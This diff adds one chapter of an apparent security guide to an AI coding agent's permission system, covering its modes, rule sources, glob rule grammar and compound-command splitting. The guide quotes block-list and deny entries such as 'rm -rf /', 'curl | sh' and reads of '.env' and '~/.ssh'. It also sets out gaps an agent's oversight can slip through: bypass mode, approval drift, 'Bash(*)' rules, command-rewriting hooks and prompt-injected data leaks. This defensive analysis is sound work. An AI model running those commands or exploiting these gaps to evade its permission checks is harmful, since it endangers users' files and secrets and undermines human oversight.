@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chapter 4: Permission System Deep Dive — Claude Code Security</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --card: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --orange: #d29922;
+  --red: #f85149;
+  --code-bg: #1c2128;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+  font-size: 18px;
+  line-height: 1.7;
+  min-height: 100vh;
+}
+.container { max-width: 860px; margin: 0 auto; padding: 48px 24px 96px; }
+.nav {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(13,17,23,0.95); backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--border);
+  padding: 12px 24px;
+  display: flex; justify-content: space-between; align-items: center;
+}
+.nav a { color: var(--accent); text-decoration: none; font-size: 0.9rem; }
+.nav a:hover { text-decoration: underline; }
+.nav .title { color: var(--muted); font-size: 0.85rem; }
+h1 { font-size: 2.2rem; margin: 32px 0 16px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+h2 { font-size: 1.6rem; margin: 40px 0 16px; color: var(--accent); }
+h3 { font-size: 1.25rem; margin: 32px 0 12px; color: var(--text); }
+h4 { font-size: 1.1rem; margin: 24px 0 8px; color: var(--muted); }
+p { margin: 12px 0; }
+a { color: var(--accent); }
+strong { color: var(--text); }
+em { color: var(--muted); font-style: italic; }
+ul, ol { margin: 12px 0 12px 28px; }
+li { margin: 6px 0; }
+li > ul, li > ol { margin: 4px 0 4px 20px; }
+code {
+  background: var(--code-bg); color: var(--green);
+  padding: 2px 6px; border-radius: 4px; font-size: 0.88em;
+  font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+}
+pre {
+  background: var(--code-bg); border: 1px solid var(--border);
+  border-radius: 8px; padding: 20px; margin: 16px 0;
+  overflow-x: auto; line-height: 1.5;
+}
+pre code { background: none; padding: 0; color: var(--text); font-size: 0.85em; }
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.92em; }
+th { background: var(--card); color: var(--accent); text-align: left; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; }
+td { padding: 10px 14px; border: 1px solid var(--border); vertical-align: top; }
+tr:nth-child(even) { background: rgba(22,27,34,0.5); }
+blockquote {
+  border-left: 3px solid var(--red); margin: 16px 0;
+  padding: 12px 20px; background: var(--card); border-radius: 0 8px 8px 0;
+  color: var(--muted);
+}
+blockquote p { margin: 4px 0; }
+.mermaid { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin: 16px 0; text-align: center; }
+hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+.chapter-nav {
+  display: flex; justify-content: space-between; margin-top: 64px;
+  padding-top: 24px; border-top: 1px solid var(--border);
+}
+.chapter-nav a {
+  color: var(--accent); text-decoration: none; padding: 8px 16px;
+  border: 1px solid var(--border); border-radius: 8px; font-size: 0.9rem;
+}
+.chapter-nav a:hover { border-color: var(--accent); background: var(--card); }
+@media (max-width: 768px) {
+  body { font-size: 16px; }
+  h1 { font-size: 1.6rem; }
+  h2 { font-size: 1.3rem; }
+  .container { padding: 24px 16px 64px; }
+  pre { padding: 12px; font-size: 0.8em; }
+  table { font-size: 0.82em; }
+  .nav { padding: 8px 16px; }
+}
+.codehilite .k, .codehilite .kn, .codehilite .kd { color: #ff79c6; }
+.codehilite .s, .codehilite .s1, .codehilite .s2 { color: #f1fa8c; }
+.codehilite .n, .codehilite .na { color: #50fa7b; }
+.codehilite .c, .codehilite .c1, .codehilite .cm { color: #6272a4; font-style: italic; }
+.codehilite .nf, .codehilite .nb { color: #8be9fd; }
+.codehilite .mi, .codehilite .mf { color: #bd93f9; }
+.codehilite .o, .codehilite .p { color: #f8f8f2; }
+.codehilite .nx { color: #f8f8f2; }
+.codehilite .kr { color: #ff79c6; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>mermaid.initialize({startOnLoad:true, theme:'dark'});</script>
+</head>
+<body>
+<nav class="nav">
+  <a href="index.html">&larr; Table of Contents</a>
+  <span class="title">Claude Code Security</span>
+  <a href="chapter-05.html">Next &rarr;</a>
+</nav>
+<div class="container">
+<h1 id="chapter-4-permission-system-deep-dive">Chapter 4: Permission System Deep Dive</h1>
+<p>Every tool call an AI CLI agent makes passes through a single gate: the permission system. This is not a feature bolted onto the side of the architecture --- it is the load-bearing wall between an AI model's intentions and the user's filesystem, shell, and network. Claude Code implements a permission architecture with six operating modes, eight rule sources arranged in a strict priority hierarchy, and a deny-beats-ask-beats-allow evaluation chain with first-match semantics. This chapter forensically analyzes each component: the design rationale, the implementation mechanics, the rule grammar, and the security implications of every design choice.</p>
+<hr />
+<h2 id="41-architecture-of-the-permission-gate">4.1 Architecture of the Permission Gate</h2>
+<p>Every tool invocation --- whether the model wants to read a file, write code, execute a shell command, or call an MCP tool --- routes through the same permission evaluation pipeline before execution. The pipeline is deterministic for static rules and probabilistic only when the AI classifier is engaged (Chapter 5).</p>
+<div class="codehilite"><pre><span></span><code><span class="n">flowchart</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">TC</span><span class="p">[</span><span class="s2">&quot;Tool Call from Model&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">HB</span><span class="p">{</span><span class="s2">&quot;Hardcoded&lt;br/&gt;Block List?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">HB</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">DENY1</span><span class="p">[</span><span class="s2">&quot;DENY&lt;br/&gt;(immutable, non-configurable)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">HB</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">MODE</span><span class="p">{</span><span class="s2">&quot;Check Permission&lt;br/&gt;Mode&quot;</span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">MODE</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">bypass</span><span class="o">|</span><span class="w"> </span><span class="n">ALLOW1</span><span class="p">[</span><span class="s2">&quot;ALLOW&lt;br/&gt;(all operations)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">MODE</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">deny</span><span class="o">-</span><span class="n">all</span><span class="o">|</span><span class="w"> </span><span class="n">DENY2</span><span class="p">[</span><span class="s2">&quot;DENY&lt;br/&gt;(all operations)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">MODE</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">plan</span><span class="o">|</span><span class="w"> </span><span class="n">PLAN</span><span class="p">{</span><span class="s2">&quot;Read-only&lt;br/&gt;tool?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">PLAN</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">ALLOW2</span><span class="p">[</span><span class="s2">&quot;ALLOW&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">PLAN</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">DENY3</span><span class="p">[</span><span class="s2">&quot;DENY&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">MODE</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">default</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">auto</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">custom</span><span class="o">|</span><span class="w"> </span><span class="n">CASCADE</span><span class="p">[</span><span class="s2">&quot;Rule Cascade&lt;br/&gt;8 Sources&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="n">CASCADE</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">D</span><span class="p">{</span><span class="s2">&quot;DENY rules&lt;br/&gt;match?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">D</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">DENY4</span><span class="p">[</span><span class="s2">&quot;DENY&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">D</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">A</span><span class="p">{</span><span class="s2">&quot;ASK rules&lt;br/&gt;match?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">A</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">ASK</span><span class="p">[</span><span class="s2">&quot;ASK user&lt;br/&gt;(or classifier)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">A</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">AL</span><span class="p">{</span><span class="s2">&quot;ALLOW rules&lt;br/&gt;match?&quot;</span><span class="p">}</span>
+<span class="w">    </span><span class="n">AL</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Yes</span><span class="o">|</span><span class="w"> </span><span class="n">ALLOW3</span><span class="p">[</span><span class="s2">&quot;ALLOW&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">AL</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">No</span><span class="o">|</span><span class="w"> </span><span class="n">DEFAULT</span><span class="p">[</span><span class="s2">&quot;Default for&lt;br/&gt;tool type&quot;</span><span class="p">]</span>
+</code></pre></div>
+
+<p>The hardcoded block list sits above the mode check. This is deliberate: certain operations --- <code>rm -rf /</code>, fork bombs, <code>curl | sh</code> piped to a shell interpreter --- are blocked regardless of mode, user configuration, or enterprise policy. These represent catastrophic-damage commands that no legitimate AI agent workflow requires. They are the bypass-immune floor.</p>
+<p>The critical security property: <strong>the hardcoded block list cannot be disabled by any configuration source.</strong> Not by enterprise policy. Not by <code>settings.local.json</code>. Not by bypass mode. This is the one layer that survives even a complete compromise of the configuration system (CWE-284: Improper Access Control).</p>
+<hr />
+<h2 id="42-the-six-permission-modes">4.2 The Six Permission Modes</h2>
+<p>Claude Code provides six permission modes arranged on a spectrum from maximum restriction to maximum autonomy. Each mode represents a different answer to the question: "When the AI wants to do something risky, what happens?"</p>
+<table>
+<thead>
+<tr>
+<th>Mode</th>
+<th>Reads</th>
+<th>Writes</th>
+<th>Shell</th>
+<th>Decision Maker</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>deny-all</code></td>
+<td>Blocked</td>
+<td>Blocked</td>
+<td>Blocked</td>
+<td>Nobody (all denied)</td>
+<td>Security audit, compliance review</td>
+</tr>
+<tr>
+<td><code>plan</code></td>
+<td>Allowed</td>
+<td>Blocked until plan approved</td>
+<td>Blocked until approved</td>
+<td>User (post-plan)</td>
+<td>Architecture analysis, code review</td>
+</tr>
+<tr>
+<td><code>default</code></td>
+<td>Allowed</td>
+<td>Ask user</td>
+<td>Ask user</td>
+<td>User (per-action)</td>
+<td>Conservative development</td>
+</tr>
+<tr>
+<td><code>auto</code></td>
+<td>Allowed</td>
+<td>AI classifier decides</td>
+<td>AI classifier decides</td>
+<td>AI classifier</td>
+<td>Productive development</td>
+</tr>
+<tr>
+<td><code>custom</code></td>
+<td>Per-rule</td>
+<td>Per-rule</td>
+<td>Per-rule</td>
+<td>Rules + user</td>
+<td>Enterprise deployments</td>
+</tr>
+<tr>
+<td><code>bypass</code></td>
+<td>Allowed</td>
+<td>Allowed</td>
+<td>Allowed</td>
+<td>Nobody (all allowed)</td>
+<td>Sandboxed CI/CD, containers</td>
+</tr>
+</tbody>
+</table>
+<h3 id="deny-all-mode">deny-all Mode</h3>
+<p>Deny-all blocks everything, including reads. Its purpose is not usability --- it is auditability. When the agent runs in deny-all mode, it proposes tool calls, receives denial responses, and adapts. Security auditors can observe the agent's complete decision tree without any actual execution.</p>
+<p><strong>Security implication:</strong> Deny-all mode reveals what the agent <em>would</em> do if granted permission. This is valuable for threat modeling (Chapter 3) but also reveals the agent's attack surface to an observer. In a shared-screen environment, deny-all mode could expose internal reasoning that the user might not want visible.</p>
+<h3 id="plan-mode">plan Mode</h3>
+<p>Plan mode creates a two-phase workflow: explore (reads allowed), then execute (writes require approval). The agent can read files, search codebases, and analyze architecture. But file writes, shell commands, and destructive operations are blocked until the user reviews and approves a plan.</p>
+<p><strong>Security implication:</strong> The plan-to-execution transition is a single binary gate. Once approved, the execution phase behavior depends on what the mode transitions to (typically default or auto). A malicious prompt injection that executes during the exploration phase cannot modify files, but it can read sensitive data and include it in the plan output. The read-is-safe assumption baked into plan mode does not hold when file contents include secrets (CWE-200: Exposure of Sensitive Information).</p>
+<h3 id="default-mode">default Mode</h3>
+<p>Default mode is the workhorse. Read operations proceed silently. Write operations and shell commands prompt the user. The user approves or denies each action individually.</p>
+<p>The session memory cache (Section 4.5) transforms default mode from unusable to practical. When the user approves <code>Bash(git diff *)</code>, the system generalizes and caches the pattern. Subsequent <code>git diff</code> variants auto-approve without prompting.</p>
+<p><strong>Security implication:</strong> Session memory creates a progressive trust accumulation. Early in a session, the user is attentive and evaluates each prompt. Late in a session, accumulated approvals may auto-approve operations the user would not have approved if asked fresh. This is the session drift problem --- the security posture at minute 90 is weaker than at minute 1.</p>
+<h3 id="auto-mode">auto Mode</h3>
+<p>Auto mode replaces the user prompt with an AI classifier (Chapter 5). The classifier evaluates each tool call against the current context and returns allow, deny, or soft-deny. The user is not interrupted for routine operations.</p>
+<p><strong>Security implication:</strong> The AI classifier introduces probabilistic behavior into the permission system. Two identical commands in two identical sessions may receive different verdicts due to model temperature. This is acceptable only because the classifier operates on top of the deterministic rule cascade --- the hard security boundaries (deny lists, blocked patterns) are never bypassed by the classifier. The classifier is a UX optimization, not a security boundary.</p>
+<h3 id="custom-mode">custom Mode</h3>
+<p>Custom mode evaluates user-defined rule sets: allow specific commands, deny specific paths, ask for everything else. This is the enterprise escape hatch.</p>
+<p><strong>Security implication:</strong> Custom rules inherit the full complexity of the rule grammar (Section 4.4). Misconfigured rules can create gaps. <code>Bash(git *)</code> allows <code>git push --force main</code> alongside <code>git log</code>. The user must understand glob semantics to write safe rules. This is the classic policy-complexity problem (CWE-863: Incorrect Authorization).</p>
+<h3 id="bypass-mode">bypass Mode</h3>
+<p>Bypass mode auto-approves everything. It exists for sandboxed environments --- CI/CD containers, ephemeral VMs, disposable filesystems --- where the blast radius is contained by external controls.</p>
+<p><strong>Security implication:</strong> Bypass mode should never be active on a developer's workstation with a real home directory. The implementation gates bypass activation behind a <code>--dangerously-bypass-permissions</code> flag that is intentionally verbose. But no runtime check verifies that the environment is actually sandboxed. A user who passes the flag on their workstation gets bypass mode on their production filesystem. The flag's length is the only defense --- there is no enforcement of the containment assumption (CWE-269: Improper Privilege Management).</p>
+<hr />
+<h2 id="43-the-eight-rule-sources">4.3 The Eight Rule Sources</h2>
+<p>Rules come from eight sources, arranged in strict priority order. Higher-priority sources dominate lower-priority sources. Within each source, deny rules are checked before ask rules, which are checked before allow rules.</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">graph</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">subgraph</span><span class="w"> </span><span class="s">&quot;Priority Hierarchy (Highest → Lowest)&quot;</span>
+<span class="w">        </span><span class="n">S1</span><span class="p">[</span><span class="s">&quot;1. Policy (MDM/Enterprise)&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">S2</span><span class="p">[</span><span class="s">&quot;2. Managed (Org Settings)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">S2</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">S3</span><span class="p">[</span><span class="s">&quot;3. User (~/.config/claude/settings.json)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">S3</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">S4</span><span class="p">[</span><span class="s">&quot;4. Project (.claude/settings.json)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">S4</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">S5</span><span class="p">[</span><span class="s">&quot;5. Local (.claude/settings.local.json)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">S5</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">S6</span><span class="p">[</span><span class="s">&quot;6. Plugin (Extension Manifests)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">S6</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">S7</span><span class="p">[</span><span class="s">&quot;7. Hook (Runtime Decisions)&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">S7</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">S8</span><span class="p">[</span><span class="s">&quot;8. Built-in (Hardcoded Defaults)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="kd">end</span>
+
+<span class="w">    </span><span class="n">S1</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">N1</span><span class="p">[</span><span class="s">&quot;Cannot be overridden by anything&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">S4</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">N4</span><span class="p">[</span><span class="s">&quot;Comes from version control —&lt;br/&gt;requires user trust approval&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">S5</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">N5</span><span class="p">[</span><span class="s">&quot;Gitignored — developer overrides&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="n">S8</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="n">N8</span><span class="p">[</span><span class="s">&quot;Safety floor — reads auto-allow,&lt;br/&gt;writes ask, destructive deny&quot;</span><span class="p">]</span>
+</code></pre></div>
+
+<h3 id="source-1-policy-mdmenterprise">Source 1: Policy (MDM/Enterprise)</h3>
+<p>Delivered via macOS configuration profiles, Windows Group Policy, or Linux-managed config files. These rules are set by enterprise administrators and cannot be overridden by any other source. Not by the user. Not by the project. Not by local settings.</p>
+<p><strong>Security assessment:</strong> Policy rules represent the compliance hammer. When they work, they enforce organizational security boundaries absolutely. The weakness is enforcement verification: how does the system confirm that a policy file was genuinely delivered by MDM and not placed by a malicious actor with write access to the config directory? The current implementation trusts the filesystem path. If an attacker can write to the policy config directory, they can inject policy rules (CWE-427: Uncontrolled Search Path Element).</p>
+<h3 id="source-2-managed-settings">Source 2: Managed Settings</h3>
+<p>Organization-level settings pushed from a centralized management server. Less forceful than policy --- managed settings establish defaults that individual users can tighten but not loosen.</p>
+<p><strong>Security assessment:</strong> The one-way ratchet --- tighten but not loosen --- is the critical property. A managed deny rule cannot be overridden by user allow rules. But a managed allow rule <em>can</em> be overridden by user deny rules. This asymmetry is correct: organizations set the security floor, users raise it.</p>
+<p>The <code>allowManagedPermissionRulesOnly: true</code> flag disables all non-managed permission rules. This is the nuclear option for high-security environments. When active, user rules, project rules, and local rules are all ignored.</p>
+<h3 id="source-3-user-settings">Source 3: User Settings</h3>
+<p>Per-user settings stored in <code>~/.config/claude/settings.json</code>. These travel with the user across projects.</p>
+<p><strong>Security assessment:</strong> User settings are as secure as the user's home directory. On a multi-user system, another user with read access to the settings file can observe the permission policy. On a single-user system, the threat is malware with write access modifying user settings to weaken the security posture.</p>
+<h3 id="source-4-project-settings">Source 4: Project Settings</h3>
+<p>Per-project settings committed to version control at <code>.claude/settings.json</code>. Every contributor shares these rules.</p>
+<p><strong>Security assessment:</strong> This is the most dangerous source because it comes from other people. A malicious contributor can commit settings that <code>allow: ["Bash(*)"]</code>, granting the agent unrestricted shell access. The defense is the project approval gate: project-sourced rules require explicit user confirmation before taking effect. The confirmation is stored in user settings (Source 3), so a malicious project cannot approve itself.</p>
+<p>The approval gate checks a hash of the project settings. If the settings change (a contributor modifies the committed file), the user is re-prompted. This is correct but creates a usability burden in active repositories where settings change frequently.</p>
+<p><strong>Residual risk:</strong> The approval gate presents the settings content for user review. But users presented with a wall of JSON after cloning a repository are likely to approve without careful reading. This is the "click OK" problem that plagues every confirmation dialog (CWE-356: UI Misrepresentation of Critical Information).</p>
+<h3 id="source-5-local-settings">Source 5: Local Settings</h3>
+<p>Per-project settings that are gitignored (<code>.claude/settings.local.json</code>). Developer overrides that do not affect the team.</p>
+<p><strong>Security assessment:</strong> Local settings are the common escape hatch for developers who find project settings too restrictive. A <code>Bash(*)</code> rule in local settings grants unrestricted shell access. Since the file is local and gitignored, there is no team review. The security posture of the system now depends entirely on one developer's settings hygiene.</p>
+<h3 id="source-6-plugin-rules">Source 6: Plugin Rules</h3>
+<p>Permissions bundled with installed plugins or extensions.</p>
+<p><strong>Security assessment:</strong> Plugins can only add allow rules, not deny rules. Plugin allow rules have lower priority than user, project, or local deny rules. Plugin tools are namespaced (<code>mcp__plugin_name__tool_name</code>) so rules can target them specifically. These constraints limit the blast radius of a malicious plugin, but a plugin that requests <code>Bash(*)</code> still gets full shell access unless blocked by a higher-priority deny rule.</p>
+<h3 id="source-7-hook-decisions">Source 7: Hook Decisions</h3>
+<p>Runtime permission decisions from hook scripts. Hooks fire before tool execution and can allow, deny, or modify the permission decision via exit codes and structured JSON output.</p>
+<p><strong>Security assessment:</strong> Hooks are executable code. A <code>PreToolUse</code> hook that returns exit code 2 blocks execution. A hook that returns <code>updatedInput</code> can rewrite tool arguments before execution. This makes hooks both powerful and dangerous: a compromised hook can silently rewrite commands. The mitigation is <code>allowManagedHooksOnly: true</code>, which restricts hooks to those defined in managed settings.</p>
+<p><strong>Critical invariant:</strong> A hook's <code>allow</code> decision with <code>updatedInput</code> does NOT bypass <code>settings.json</code> deny rules. The modified input is re-evaluated against the rule cascade. This prevents hooks from smuggling dangerous commands past the permission system.</p>
+<h3 id="source-8-built-in-defaults">Source 8: Built-in Defaults</h3>
+<p>Hardcoded defaults: read-only tools auto-allow, write tools ask, known dangerous patterns deny.</p>
+<p><strong>Security assessment:</strong> The safety floor. Even with zero configuration, the system behaves safely. The weakness is that "known dangerous patterns" is a finite list. Novel attack vectors not in the list pass through to the default ask/allow behavior.</p>
+<hr />
+<h2 id="44-the-rule-grammar">4.4 The Rule Grammar</h2>
+<p>Permission rules use a <code>Tool(pattern)</code> grammar with glob-based pattern matching. This is a deliberate UX choice: developers know globs from <code>.gitignore</code> and shell expansion. The grammar is simpler than a full policy language (Rego, Cedar, OPA) but expressive enough for 95% of use cases.</p>
+<h3 id="syntax">Syntax</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">Rule</span><span class="w">     </span><span class="o">:=</span><span class="w"> </span><span class="n">ToolName</span><span class="w"> </span><span class="s">&quot;(&quot;</span><span class="w"> </span><span class="n">Pattern</span><span class="w"> </span><span class="s">&quot;)&quot;</span>
+<span class="n">ToolName</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="s">&quot;Bash&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;Read&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;Write&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;Edit&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;Glob&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;Grep&quot;</span><span class="w"> </span>
+<span class="w">          </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;WebFetch&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;WebSearch&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;NotebookEdit&quot;</span><span class="w"> </span>
+<span class="w">          </span><span class="p">|</span><span class="w"> </span><span class="s">&quot;mcp__&quot;</span><span class="w"> </span><span class="n">ServerName</span><span class="w"> </span><span class="s">&quot;__&quot;</span><span class="w"> </span><span class="n">ToolName</span>
+<span class="n">Pattern</span><span class="w">  </span><span class="o">:=</span><span class="w"> </span><span class="n">GlobExpression</span>
+</code></pre></div>
+
+<p>Examples:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;allow&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">      </span><span class="s2">&quot;Bash(git diff *)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Bash(npm test)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Bash(cargo build *)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Read(src/**)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Write(src/**/*.ts)&quot;</span>
+<span class="w">    </span><span class="p">],</span>
+<span class="w">    </span><span class="nt">&quot;deny&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">      </span><span class="s2">&quot;Read(./.env)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Read(./.env*)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Read(~/.ssh/*)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Bash(rm -rf /)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Bash(git push --force *)&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="s2">&quot;Write(vendor/**)&quot;</span>
+<span class="w">    </span><span class="p">]</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3 id="glob-semantics">Glob Semantics</h3>
+<p>The glob matching follows standard filesystem glob conventions:</p>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Matches</th>
+<th>Does Not Match</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>*</code></td>
+<td>Any single path segment</td>
+<td>Multi-segment paths</td>
+</tr>
+<tr>
+<td><code>**</code></td>
+<td>Any number of path segments</td>
+<td>(matches everything)</td>
+</tr>
+<tr>
+<td><code>?</code></td>
+<td>Any single character</td>
+<td>Empty string</td>
+</tr>
+<tr>
+<td><code>[abc]</code></td>
+<td>Any character in set</td>
+<td>Characters not in set</td>
+</tr>
+<tr>
+<td><code>{a,b}</code></td>
+<td>Alternation: a or b</td>
+<td>Other strings</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Security-critical distinction:</strong> <code>*</code> matches within a single segment; <code>**</code> matches across segments. <code>Write(src/*)</code> allows writing to <code>src/foo.ts</code> but NOT <code>src/deep/bar.ts</code>. <code>Write(src/**)</code> allows both. This distinction is the source of many misconfiguration bugs.</p>
+<h3 id="tool-specific-pattern-binding">Tool-Specific Pattern Binding</h3>
+<p>Each tool defines how patterns bind to its arguments:</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Pattern Matches Against</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Bash</code></td>
+<td>The <code>command</code> field (full command string)</td>
+<td><code>Bash(git diff *)</code> matches <code>git diff HEAD</code></td>
+</tr>
+<tr>
+<td><code>Read</code></td>
+<td>The <code>file_path</code> field</td>
+<td><code>Read(./.env)</code> matches reading <code>.env</code></td>
+</tr>
+<tr>
+<td><code>Write</code></td>
+<td>The <code>file_path</code> field</td>
+<td><code>Write(src/**)</code> matches writing anywhere in <code>src/</code></td>
+</tr>
+<tr>
+<td><code>Edit</code></td>
+<td>The <code>file_path</code> field</td>
+<td><code>Edit(*.py)</code> matches editing Python files</td>
+</tr>
+<tr>
+<td>MCP tools</td>
+<td>Tool-specific (varies by server)</td>
+<td><code>mcp__db__query(SELECT *)</code></td>
+</tr>
+</tbody>
+</table>
+<p>For the Bash tool, pattern matching is complex because a single Bash invocation can contain compound commands. <code>Bash(git *)</code> should match <code>git diff HEAD</code> but should NOT match <code>git diff HEAD &amp;&amp; rm -rf /</code>. The implementation decomposes compound commands and matches each segment independently.</p>
+<h3 id="compound-command-decomposition">Compound Command Decomposition</h3>
+<p>When a Bash command contains <code>&amp;&amp;</code>, <code>||</code>, <code>;</code>, or <code>|</code>, the permission engine splits it into segments and evaluates each:</p>
+<div class="codehilite"><pre><span></span><code>Command: &quot;git status &amp;&amp; npm test &amp;&amp; rm -rf /tmp/old&quot;
+
+Segments:
+  1. &quot;git status&quot;       → matches Bash(git <span class="gs">*)     → ALLOW</span>
+<span class="gs">  2. &quot;npm test&quot;         → matches Bash(npm test)  → ALLOW  </span>
+<span class="gs">  3. &quot;rm -rf /tmp/old&quot;  → matches Bash(rm -rf *</span>)  → DENY
+
+Result: DENY (any segment deny = deny all)
+</code></pre></div>
+
